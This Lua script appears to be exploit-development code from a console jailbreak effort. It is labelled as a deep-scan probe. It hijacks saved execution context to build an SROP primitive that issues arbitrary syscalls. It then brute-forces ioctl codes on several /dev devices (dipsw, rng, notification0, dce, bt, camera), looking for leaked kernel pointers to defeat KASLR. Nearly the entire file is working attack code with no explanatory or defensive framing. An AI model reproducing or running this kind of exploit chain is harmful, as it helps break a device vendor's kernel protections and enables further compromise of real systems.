-- CRASH_CLASS: LOW
-- PROBE 139c: dipsw/rng/notification ioctl deep scan
--
-- On PS4, dipsw ioctl leaked kernel function pointers.
-- rng is a hardware RNG device that might be less hardened.
-- notification devices handle kernel notifications.
-- Also try bt/hid/camera ioctl with Sony codes.

print("=== PROBE 139c: DIPSW+RNG+NOTIF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local path_buf = gpu + 0x100
local io_buf = gpu + 0x300
local rd_buf = gpu + 0x600

local function try_ioctl(fd, code)
    zero(io_buf, 0x100)
    local rv = srop(54, uint64(fd), uint64(code), ua(io_buf))
    local ivh, ivl = get_hi_lo(rv)
    if ivl == 0 and ivh == 0 then
        local has_data = false
        for off = 0, 0x60, 8 do
            local v = safe_rq(io_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    if not has_data then
                        print(string.format("  *** ioctl 0x%08X WORKS!", code))
                        has_data = true
                    end
                    print(string.format("    +0x%02X: %s", off, hex(v)))
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print("    *** KERNEL POINTER! ***")
                    end
                end
            end
        end
        if not has_data then
            print(string.format("  ioctl 0x%08X OK (empty)", code))
        end
        return true
    end
    return false
end

--------------------------------------------------------------------
-- A: dipsw ioctl (PS4 KASLR leak source)
--------------------------------------------------------------------
print("")
print("--- [A] dipsw ioctl ---")
ws(path_buf, "/dev/dipsw")
local fd_dipsw = srop(5, ua(path_buf), uint64(0))
local dh, dl = get_hi_lo(fd_dipsw)
if dl > 0 and dl < 256 and dh == 0 then
    print("[A] dipsw fd=" .. dl)

    -- PS4 known codes (group 0x88)
    local hits = 0
    -- Comprehensive scan: all commands 0-31 with different sizes and directions
    for cmd = 0, 31 do
        -- Read direction (0x40), various sizes
        for _, sz in ipairs({4, 8, 16, 32, 64, 128}) do
            if try_ioctl(dl, 0x40000000 + (sz * 0x10000) + 0x8800 + cmd) then
                hits = hits + 1
            end
        end
        -- Write+Read direction (0xC0)
        for _, sz in ipairs({4, 8, 16}) do
            if try_ioctl(dl, 0xC0000000 + (sz * 0x10000) + 0x8800 + cmd) then
                hits = hits + 1
            end
        end
    end
    -- Void ioctls
    for cmd = 0, 15 do
        if try_ioctl(dl, 0x20008800 + cmd) then hits = hits + 1 end
    end
    -- Also try group 'd'=0x64 (dipsw)
    for cmd = 0, 7 do
        for _, sz in ipairs({4, 8}) do
            if try_ioctl(dl, 0x40000000 + (sz * 0x10000) + 0x6400 + cmd) then
                hits = hits + 1
            end
        end
    end
    print("[A] dipsw hits=" .. hits)
    srop(6, uint64(dl))
else
    print("[A] dipsw OPEN FAIL")
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: rng (hardware RNG) read + ioctl
--------------------------------------------------------------------
print("")
print("--- [B] rng ---")
ws(path_buf, "/dev/rng")
local fd_rng = srop(5, ua(path_buf), uint64(0x0004))
local rrh, rrl = get_hi_lo(fd_rng)
if rrl > 0 and rrl < 256 and rrh == 0 then
    print("[B] rng fd=" .. rrl)
    -- Read some random data
    zero(rd_buf, 0x100)
    local rv_rd = srop(3, uint64(rrl), ua(rd_buf), uint64(0x40))
    local rdh, rdl = get_hi_lo(rv_rd)
    if rdl > 0 and rdl <= 0x40 and rdh == 0 then
        print("[B] rng read " .. rdl .. " bytes")
        -- Print first 32 bytes as hex
        local s = ""
        for i = 0, math.min(rdl, 32) - 1 do
            s = s .. string.format("%02X ", to_num(memory.read_byte(rd_buf + i)))
        end
        print("[B] " .. s)
    else
        print("[B] rng read=" .. hex(rv_rd))
    end
    -- rng ioctl
    local hits = 0
    for _, grp in ipairs({0x52, 0x72, 0x88, 0x44}) do
        for cmd = 0, 7 do
            for _, sz in ipairs({4, 8}) do
                if try_ioctl(rrl, 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd) then
                    hits = hits + 1
                end
            end
        end
    end
    print("[B] rng ioctl hits=" .. hits)
    srop(6, uint64(rrl))
else
    print("[B] rng OPEN FAIL")
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: notification0 ioctl
--------------------------------------------------------------------
print("")
print("--- [C] notification0 ---")
ws(path_buf, "/dev/notification0")
local fd_not = srop(5, ua(path_buf), uint64(2))
local nh, nl = get_hi_lo(fd_not)
if nl > 0 and nl < 256 and nh == 0 then
    print("[C] notification0 fd=" .. nl)
    local hits = 0
    -- Notification device likely uses Sony group codes
    for _, grp in ipairs({0x4E, 0x6E, 0x88, 0x44, 0x53, 0x41}) do
        for cmd = 0, 15 do
            for _, sz in ipairs({4, 8, 16, 32, 64}) do
                if try_ioctl(nl, 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd) then
                    hits = hits + 1
                end
            end
        end
    end
    print("[C] notification0 ioctl hits=" .. hits)
    srop(6, uint64(nl))
else
    print("[C] notification0 OPEN FAIL")
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: dce ioctl (display controller — might have GPU kernel addrs)
--------------------------------------------------------------------
print("")
print("--- [D] dce ioctl ---")
ws(path_buf, "/dev/dce")
local fd_dce = srop(5, ua(path_buf), uint64(2))
local dceh, dcel = get_hi_lo(fd_dce)
if dcel > 0 and dcel < 256 and dceh == 0 then
    print("[D] dce fd=" .. dcel)
    local hits = 0
    for _, grp in ipairs({0x44, 0x64, 0x88, 0x47, 0x53}) do
        for cmd = 0, 15 do
            for _, sz in ipairs({4, 8, 16, 32, 64}) do
                if try_ioctl(dcel, 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd) then
                    hits = hits + 1
                end
            end
        end
    end
    print("[D] dce ioctl hits=" .. hits)
    srop(6, uint64(dcel))
else
    print("[D] dce OPEN FAIL")
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: bt (bluetooth) + camera ioctl
--------------------------------------------------------------------
print("")
print("--- [E] bt+camera ---")
for _, dev in ipairs({"bt", "camera"}) do
    ws(path_buf, "/dev/" .. dev)
    local fd = srop(5, ua(path_buf), uint64(2))
    local fh, fl = get_hi_lo(fd)
    if fl > 0 and fl < 256 and fh == 0 then
        print("[E] " .. dev .. " fd=" .. fl)
        local hits = 0
        for _, grp in ipairs({0x42, 0x62, 0x88, 0x43, 0x63}) do
            for cmd = 0, 7 do
                for _, sz in ipairs({4, 8, 16}) do
                    if try_ioctl(fl, 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd) then
                        hits = hits + 1
                    end
                end
            end
        end
        print("[E] " .. dev .. " ioctl hits=" .. hits)
        srop(6, uint64(fl))
    else
        print("[E] " .. dev .. " OPEN FAIL")
    end
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
